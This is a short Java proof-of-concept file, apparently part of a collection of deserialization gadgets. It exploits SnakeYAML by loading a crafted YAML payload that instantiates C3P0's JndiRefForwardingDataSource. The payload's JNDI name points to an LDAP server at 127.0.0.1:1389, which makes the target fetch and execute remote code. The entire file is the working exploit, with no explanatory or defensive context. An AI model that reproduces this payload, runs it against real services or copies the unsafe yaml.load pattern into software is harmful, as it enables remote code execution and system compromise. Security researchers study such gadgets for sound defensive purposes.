package AvailableGadgets;


import org.yaml.snakeyaml.Yaml;

// C3P0 JndiRefForwardingDataSource EXP
public class C3P0JndiRefForwardingDataSourceEXP {
    public static void main(String[] args) {
        String payload = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
                "  jndiName: \"ldap://127.0.0.1:1389/Exploit\"\n" +
                "  loginTimeout: 1";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
